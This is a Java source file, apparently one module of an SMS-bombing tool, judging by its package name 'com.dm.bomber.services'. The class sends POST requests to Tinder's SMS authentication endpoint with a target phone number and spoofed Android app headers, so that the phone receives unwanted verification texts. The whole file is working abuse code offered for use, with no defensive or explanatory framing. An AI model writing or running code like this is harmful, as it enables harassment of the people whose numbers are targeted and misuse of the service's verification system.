package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Tinder extends JsonService {

    public Tinder() {
        setUrl("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("os-version", "29");
        builder.addHeader("app-version", "3754");
        builder.addHeader("platform", "android");
        builder.addHeader("x-supported-image-formats", "webp");
        builder.addHeader("tinder-version", "11.10.1");
        builder.addHeader("persistent-device-id", "************");
        builder.addHeader("app-session-id", "*******");
        builder.addHeader("app-session-time-elapsed", "99.2");
        builder.addHeader("install-id", "**********");
        builder.addHeader("User-Agent", "Tinder Android Version 11.10.1");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone_number", getFormattedPhone());
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
